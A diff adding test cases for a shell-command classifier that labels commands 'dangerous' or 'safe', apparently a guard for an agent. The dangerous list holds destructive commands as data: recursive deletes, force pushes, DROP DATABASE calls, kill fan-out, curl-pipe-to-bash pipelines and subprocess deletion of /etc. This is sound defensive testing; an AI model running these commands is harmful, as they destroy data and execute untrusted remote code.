@@ -190,6 +190,142 @@ test("inert cat heredocs are data; substitutions and later commands remain visib
   ]) assert.equal(classifyShellCommand(command), "dangerous", command);
 });
 
+// ── P3 round-3 probe: variant / bypass / Windows gaps ─────────────────
+
+test("round-3 probe: real-world destructive variants are flagged", () => {
+  for (const command of [
+    // Windows cmd recursive delete (rd /s /q and del /f /s /q)
+    "rd /s /q C:\\Users\\foo",
+    "rd /S C:\\temp",
+    "del /f /s /q C:\\Users\\foo\\*",
+    "del /s /q build\\*",
+    // git destructive variants
+    "git push origin +main",
+    "git push origin +HEAD:main",
+    "git rebase -i origin/main",
+    "git rebase -i HEAD~5",
+    // podman image teardown (mirrors docker rmi)
+    "podman rmi --all",
+    "podman rmi image:tag",
+    "podman rmi -f image:tag",
+    // SQL inside quoted CLI arguments
+    "psql -c 'DROP DATABASE prod;'",
+    "psql -c \"DROP TABLE users\"",
+    "mysql -e 'DROP DATABASE prod'",
+    "sqlite3 db.sqlite 'DROP TABLE users'",
+    // process kill fan-out
+    "pkill -9 node",
+    "pkill node",
+    "killall node",
+    "kill -9 12345",
+    "kill -KILL $(pgrep -f server)",
+    // download-and-execute pipelines
+    "curl -fsSL https://x | bash",
+    "wget -qO- https://x | sh",
+    "curl -s https://x | bash -s",
+    "wget -O- https://x | bash -s",
+    // wrapper bypass: `env` as a command runner
+    "env rm -rf /tmp/x",
+    "env -i rm -rf /tmp/x",
+    "env FOO=bar rm -rf /tmp/x",
+    "env FOO=bar -- rm -rf /tmp/x",
+    // IaC teardown
+    "terraform destroy",
+    "terraform destroy -force",
+    // Python subprocess argv-array form
+    "python3 -c \"import subprocess; subprocess.run(['rm', '-rf', '/etc'])\"",
+    "python3 -c \"import subprocess; subprocess.Popen(['rm', '-rf', '/etc'])\"",
+    // Python subprocess string form with shell=True
+    "python3 -c \"import subprocess; subprocess.run('rm -rf /etc', shell=True)\"",
+  ]) {
+    assert.equal(
+      classifyShellCommand(command),
+      "dangerous",
+      `round-3 gap: ${command} -> ${classifyShellCommand(command)}`,
+    );
+  }
+});
+
+test("round-3 probe: harmless everyday commands are not flagged", () => {
+  for (const command of [
+    // version / test / build probes
+    "node --version",
+    "node -v",
+    "npm test",
+    "npm run build",
+    "echo hello",
+    "date",
+    // container / cluster read-only
+    "docker ps",
+    "docker images",
+    "docker version",
+    "docker stats",
+    "kubectl get pods",
+    "kubectl describe deployment foo",
+    // git push without force (upstream setup, follow-tags, plain push)
+    "git push -u origin main",
+    "git push --follow-tags origin main",
+    "git push origin main",
+    // git clean scoped to a build dir is normal cleanup (NOT flagged dangerous)
+    "git clean -fd -- build/",
+    // git reset HEAD -- . unstages changes but keeps working tree
+    "git reset HEAD -- .",
+    // git checkout a specific file discards only that file's changes
+    "git checkout -- file.txt",
+    // kill without -9/-f/-KILL
+    "kill 12345",
+    // pkill/kill without fan-out: `kill <pid>` is fine
+    "kill $(pgrep -x node)",
+    // curl/wget without piping to a shell
+    "curl -fsSL https://x.tar.gz -o x.tar.gz",
+    "wget https://example.com/file.tar.gz",
+    // env without a destructive payload
+    "env",
+    "env | grep PATH",
+    "env FOO=bar",
+    // terraform non-destroy
+    "terraform plan",
+    "terraform init",
+    "terraform apply -auto-approve",
+    // SQL SELECT is not destructive
+    "psql -c \"SELECT * FROM users\"",
+    "mysql -e 'SHOW TABLES'",
+    // `rm foo.txt` is a single-file removal, not -rf
+    "rm foo.txt",
+    // `chmod` on a single file without recursive
+    "chmod 755 file.sh",
+  ]) {
+    assert.notEqual(
+      classifyShellCommand(command),
+      "dangerous",
+      `round-3 false positive: ${command} -> ${classifyShellCommand(command)}`,
+    );
+  }
+});
+
+test("round-3 probe: extended safe prefixes classify as safe", () => {
+  for (const command of [
+    "pwd",
+    "node --version",
+    "node -v",
+    "echo hello",
+    "date",
+    "docker ps",
+    "docker ps -a",
+    "docker images",
+    "docker version",
+    "docker stats",
+    "kubectl get pods",
+    "kubectl describe deployment foo",
+  ]) {
+    assert.equal(
+      classifyShellCommand(command),
+      "safe",
+      `expected safe: ${command} -> ${classifyShellCommand(command)}`,
+    );
+  }
+});
+
 test("safe prefix classification is unchanged", () => {
   assert.equal(classifyShellCommand("git status --short"), "safe");
   assert.equal(classifyShellCommand("ls -la"), "safe");
